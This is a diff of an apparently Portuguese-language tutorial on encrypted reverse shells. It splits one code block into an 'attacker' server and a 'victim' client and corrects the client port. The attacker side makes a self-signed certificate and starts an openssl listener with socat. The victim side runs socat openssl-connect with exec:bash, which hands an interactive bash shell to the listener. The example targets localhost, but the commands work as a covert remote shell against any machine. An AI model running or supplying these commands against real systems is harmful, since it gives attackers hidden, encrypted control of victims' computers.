@@ -56,18 +56,18 @@ Abra duas instâncias do terminal e teste em localhost.
 
 Basta usar o openssl para criar as chaves.
 
+Servidor:
 ```shell
-
-# Atacante-Servidor
-
+# Atacante
 PORT="1111"
 openssl req -x509 -sha256 -newkey rsa:2048 -keyout server.pem -out server.pem -days 1000 -nodes -subj "/C=NA/ST=NARNIA/L=HIDDEN/O=Global Security/OU=IT Department/CN=hidden.onion"
 socat $(tty),raw,echo=0 openssl-listen:$PORT,reuseaddr,cert=server.pem,verify=0
-
-# Vítima-cliente
-
+```
+Cliente:
+```shell
+# Vítima
 HOST=localhost
-PORT=80
+PORT=1111
 socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid  
  ```
   
